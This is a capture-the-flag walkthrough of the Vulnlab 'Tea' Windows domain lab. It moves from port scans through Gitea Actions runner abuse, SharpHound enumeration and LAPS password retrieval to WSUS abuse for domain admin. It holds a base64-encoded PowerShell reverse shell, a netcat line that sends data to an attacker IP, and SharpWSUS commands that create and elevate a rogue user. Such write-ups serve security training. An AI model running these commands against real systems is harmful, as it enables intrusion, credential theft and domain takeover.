# Vulnlab - Tea


## DC.tea.vl

```bash
PORT     STATE    SERVICE       VERSION
80/tcp   filtered http               
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-22 11:44:27Z)
135/tcp  open     msrpc         Microsoft Windows RPC
445/tcp  open     microsoft-ds?                        
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.tea.vl
| Issuer: commonName=DC.tea.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-19T15:32:23
| Not valid after:  2024-06-19T15:32:23
| MD5:   192634541f77066c4d54456555ec94a4
|_SHA-1: 4db67e0cd398334e78518b2f4b063b4d342f1508
|_ssl-date: 2024-02-22T11:45:15+00:00; +45s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TEA
|   NetBIOS_Domain_Name: TEA
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: tea.vl
|   DNS_Computer_Name: DC.tea.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-22T11:44:35+00:00
9389/tcp open     mc-nmf        .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
```

## SRV.tea.vl

```bash
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:                                 
|   Supported Methods: OPTIONS TRACE GET HEAD POST            
|_  Potentially risky methods: TRACE        
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?                               
3000/tcp  open  ppp?           
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request                
|     Content-Type: text/plain; charset=utf-8 
|     Connection: close                
|     Request                            
|   GetRequest:                                  
|     HTTP/1.0 200 OK                                       
|     Cache-Control: max-age=0, private, must-revalidate,
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
|_ssl-date: 2024-02-22T12:35:01+00:00; +44s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TEA
|   NetBIOS_Domain_Name: TEA
|   NetBIOS_Computer_Name: SRV
|   DNS_Domain_Name: tea.vl
|   DNS_Computer_Name: SRV.tea.vl
```
## PORT 3000 (Gitea)

<img src="https://i.imgur.com/2MTYDmt.png"/>
Registering an account on gitea and checking the users, we only have `gitea@tea.vl`

<img src="https://i.imgur.com/PV6bgvn.png"/>

## Abusing gitea runner

This version is running `1.21.2` which doesn't have any exploits, from user settings under `Actions` we have one active runner 

<img src="https://i.imgur.com/KyonL9I.png"/>

To abuse this runner, we need to first create a repository and enable `Actions`

<img src="https://i.imgur.com/2Ouqf3o.png"/>

Now creating `.gitea/workflows/demo.yaml` file in the repository that we have created

<img src="https://i.imgur.com/ItKHNc2.png"/>

<img src="https://i.imgur.com/erRIlaW.png"/>

Using base64 encoded reverse shell

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADAALgAxADMANgAiACwAMgAyADIAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

```yaml
name: Gitea Actions Demo
run-name: ${{ gitea.actor }} is testing out Gitea Actions 🚀
on: [push]
jobs:
	Explore-Gitea-Actions:
		runs-on: windows-latest
		steps:
		- run: powershell -e encode_command
```

<img src="https://i.imgur.com/uXOsRJT.png"/>

Transferring and executing `SharpHound`

```powershell
Sharphound.exe -c all
```

<img src="https://i.imgur.com/kQjD9qm.png"/>

To transfer the output, we can utilize netcat

```bash
cmd.exe /c '.\nc.exe -w 3 10.8.0.136 2222 < 20240222075332_BloodHound.zip'

nc -l -p 2222 > 20240222075332_BloodHound.zip
```

<img src="https://i.imgur.com/oIqMky1.png"/>

From bloodhound, it doesn't show much what ACLs does thomas have but we do see that it belongs to `Server Administration` group

<img src="https://i.imgur.com/kSEtcEj.png"/>

From `C:\` drive, we can see WSUS, so we might be able to abuse it 

<img src="https://i.imgur.com/biarHBc.png"/>
## Reading LAPS on SRV

We also have `_install` folder having LAPS (Locally Administratrive Password Solution) installer, 

<img src="https://i.imgur.com/zOb84YK.png"/>

We can try reading LAPS on SRV as this user belongs to server administrator group, from the documentation we can use `Get-LapsADPassword` to retrieve clear text password of local administrator on SRV

https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2022-ps

```bash
Get-LapsADPassword -Identity SRV -AsPlainText
```

<img src="https://i.imgur.com/eesNWOf.png"/>
We can verify this from netexec

<img src="https://i.imgur.com/gs1ePDV.png"/>

We know WSUS is installed which is a solution for deploying windows updates for systems in a domain where the hosts don’t have to reach out to internet to get the updates instead they can get updates internally

<img src="https://i.imgur.com/rEGZgfB.png"/>

## Abusing WSUS To Become Domain Admin 

Since SRV is WSUS server from where updates are deployed and we are local admin, we can deploy malicious updates to DC like adding our own user to be part of domain admin, first we'll have to create a domain user 
 
```bash
cmd.exe /c 'SharpWSUS.exe create /payload:"C:\Users\Administrator\Documents\PsExec64.exe" /args:"-accepteula -s -d cmd.exe  /c \" net user arz P@assword123 /add \"" /title:"Up
dating"'
```

<img src="https://i.imgur.com/sipfZPP.png"/>

Now approving the update

<img src="https://i.imgur.com/c48Ok8E.png"/>

Verifying if the user is created

<img src="https://i.imgur.com/n3cbcMn.png"/>

Now adding this to local administrators group on DC

```bash
cmd.exe /c 'SharpWSUS.exe create /payload:"C:\Users\Administrator\Documents\PsExec64.exe" /args:"-accepteula -s -d cmd.exe  /c \"net localgroup administrators arz /add \"" /title:"Updating"'
```

<img src="https://i.imgur.com/fbEsB5A.png"/>

Being a local admin on DC, we can just login through winrm

<img src="https://i.imgur.com/5K7ijRk.png"/>

# References

- https://blog.gitea.com/hacking-on-gitea-actions/
- https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2022-ps
